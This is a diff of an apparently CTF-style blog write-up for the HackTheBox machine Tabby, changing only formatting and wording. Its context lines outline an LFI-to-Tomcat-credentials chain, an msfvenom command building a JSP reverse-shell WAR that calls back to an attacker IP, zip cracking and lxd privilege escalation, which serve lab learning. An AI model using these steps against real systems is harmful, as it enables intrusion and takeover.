@@ -6,14 +6,10 @@ categories: [HackTheBox,Linux Machines]
 tags: [hackthebox, tabby, ctf, lfi, local-file-inclusion, tomcat, php, creds, users, text-manager, msfvenom, curl, war, john, zip2john, password-reuse, hash, lxd, lxc, container ]
 image: /assets/img/Posts/Tabby.png
 ---
-## Overview
-```html
-The box starts with us finding a Local File Inclusion Vulnerability on port 80 and we have tomcat running on port 8080 ,so 
-we can use the LFI vulnerability to find credentials for tomcat's manager application.
-Then we get a shell on the box by a malicious WAR file upload. We find a password protected zip file in the /var/www/html/files directory,
-on cracking the zip file with the help of john the ripper we get the password for the user ash. Turns out the user ash is part of the lxd group which
-can be exploited and we root the box. 
-  ```
+## Overview:
+
+The box starts with us finding a <code class="language-plaintext highlighter-rouge">Local File Inclusion Vulnerability<code> on port 80 and we have <code class="language-plaintext highlighter-rouge">tomcat</code> running on port 8080 ,so we can use the LFI vulnerability to find credentials for tomcat's manager application.Then we get a shell on the box by a malicious <code class="language-plaintext highlighter-rouge">WAR file upload</code>. We find a password protected zip file in the /var/www/html/files directory,on cracking the zip file with the help of <code class="language-plaintext highlighter-rouge">john the ripper</code> we get the password for the user ash. Turns out the user ash is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group which can be exploited and we root the box. 
+  
 ## Reconnaissance
 ### Nmap Scan
 ```shell
@@ -75,7 +71,7 @@ Let's get the credentials now. We get a blank page but if we view the source cod
   <img src="/assets/images/tabby-tomcat-users-xml.png" class="center">
 </p>
 We can't access the manager-gui to upload a malicious WAR file but we still can use curl to upload since we have the manager-script role.
-### Using msfvenom to create a WAR file reverse shell.
+## Using msfvenom to create a WAR file reverse shell.
 ```shell
 ┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
 └─$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.9 lport=4444 -f war > sid.war
@@ -238,5 +234,5 @@ cat root.txt
 6ab5823df58c34e18f93b8cccb0d28d7
 /mnt/root/root #
 ```
-And that was the box, hope you liked my writeup :D
+And that was the box, hope you learned something new :D
 
